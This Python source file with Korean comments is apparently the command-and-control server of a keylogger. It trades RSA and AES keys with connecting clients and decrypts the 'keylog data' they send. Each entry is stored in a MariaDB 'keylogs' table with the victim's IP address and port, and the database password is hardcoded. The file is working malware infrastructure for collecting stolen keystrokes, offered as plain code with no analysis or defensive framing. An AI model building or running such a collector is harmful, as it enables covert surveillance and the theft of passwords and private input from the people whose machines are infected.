import socket
import threading
import mysql.connector
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import uuid

# RSA 키 생성
rsa_key = RSA.generate(2048)
private_key = rsa_key
public_key = rsa_key.publickey()

def initialize_database():
    """
    데이터베이스 초기화 함수
    """
    try:
        connection = mysql.connector.connect(
            host="localhost",
            user="brainoverflow",
            password="1234",
            port=3306
        )
        cursor = connection.cursor()

        # 데이터베이스 생성
        cursor.execute("CREATE DATABASE IF NOT EXISTS test CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;")
        cursor.execute("USE test;")

        # 테이블 생성
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS keylogs (
                id INT AUTO_INCREMENT PRIMARY KEY,
                session_id VARCHAR(8) NOT NULL,
                message TEXT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci,
                client_ip VARCHAR(45) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci,
                client_port INT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            ) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
        """)

        connection.commit()
        cursor.close()
        connection.close()
        print("Database initialized successfully.")
    except mysql.connector.Error as e:
        print(f"Database initialization error: {e}")

def connect_to_db():
    """
    MariaDB 연결 함수
    """
    try:
        connection = mysql.connector.connect(
            host="localhost",
            user="brainoverflow",
            password="1234",
            database="test",
            port=3306,
            charset="utf8mb4",
            collation="utf8mb4_general_ci",
        )
        return connection
    except mysql.connector.Error as e:
        print(f"Database error: {e}")
        return None

def encrypt_message(message: str, aes_key: bytes, iv: bytes) -> bytes:
    """
    AES 암호화
    """
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
    encryptor = cipher.encryptor()
    return iv + encryptor.update(message.encode()) + encryptor.finalize()

def decrypt_message(encrypted_message: bytes, aes_key: bytes) -> str:
    """
    AES 복호화
    """
    iv = encrypted_message[:16]
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_message[16:]) + decryptor.finalize()
    return decrypted_data.decode('utf-8', errors="replace")

def handle_client(conn, addr):
    """
    클라이언트 처리 함수
    """
    session_id = str(uuid.uuid4())[:8]
    print(f"Client connected: {addr} (Session ID: {session_id})")

    try:
        # RSA 공개키 전송
        conn.send(public_key.export_key())
        encrypted_aes_key = conn.recv(256)

        if not encrypted_aes_key:
            raise ValueError("AES key was not received properly.")

        # AES 키 복호화
        cipher_rsa = PKCS1_OAEP.new(private_key)
        aes_key = cipher_rsa.decrypt(encrypted_aes_key)

        client_ip, client_port = addr

        while True:
            data = conn.recv(8192)
            if not data:
                print(f"Client disconnected: (Session ID: {session_id})")
                break

            # 데이터 복호화
            try:
                decrypted_data = decrypt_message(data, aes_key)
                print(f"Received keylog data from client {addr} (Session ID: {session_id}): {decrypted_data}")
            except Exception as e:
                print(f"Data decryption error (Session ID: {session_id}): {e}")
                break

            # 데이터베이스에 로그 저장
            connection = connect_to_db()
            if connection:
                try:
                    cursor = connection.cursor()
                    cursor.execute(
                        "INSERT INTO keylogs (session_id, message, client_ip, client_port) VALUES (%s, %s, %s, %s)",
                        (session_id, decrypted_data, client_ip, client_port),
                    )
                    connection.commit()
                    cursor.close()
                except mysql.connector.Error as e:
                    print(f"Database insert error (Session ID: {session_id}): {e}")
                finally:
                    connection.close()

            # 응답 전송
            response = f"Data received from session {session_id}."
            iv = get_random_bytes(16)
            encrypted_response = encrypt_message(response, aes_key, iv)
            conn.sendall(encrypted_response)

    except Exception as e:
        print(f"Error in client handling (Session ID: {session_id}): {e}")
    finally:
        conn.close()
        print(f"Connection closed (Session ID: {session_id})")

def start_server(host='172.25.80.175', port=12345):
    """
    서버 시작
    """
    # 데이터베이스 초기화
    initialize_database()

    # 서버 소켓 시작
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Server running on {host}:{port}")

    while True:
        conn, addr = server_socket.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()


if __name__ == "__main__":
    start_server()